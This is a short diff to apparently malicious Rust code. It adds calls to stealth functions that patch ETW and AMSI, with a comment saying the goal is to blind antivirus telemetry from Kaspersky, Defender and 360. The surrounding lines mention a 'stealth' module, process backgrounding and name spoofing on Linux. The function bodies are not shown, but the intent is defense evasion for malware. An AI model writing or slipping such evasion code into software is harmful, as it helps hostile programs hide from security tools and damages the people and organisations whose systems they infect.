@@ -96,6 +96,10 @@
     // 5. [Benign] Final environment prep
     stealth::check_network_config();
 
+    // 6. [Anti-Analysis] Patch ETW and AMSI to blind local AV telemetry (Kaspersky, Defender, 360)
+    stealth::patch_etw();
+    stealth::patch_amsi();
+
     // 9. Backgrounding and Name Spoofing (Linux)
     #[cfg(target_os = "linux")]
     {
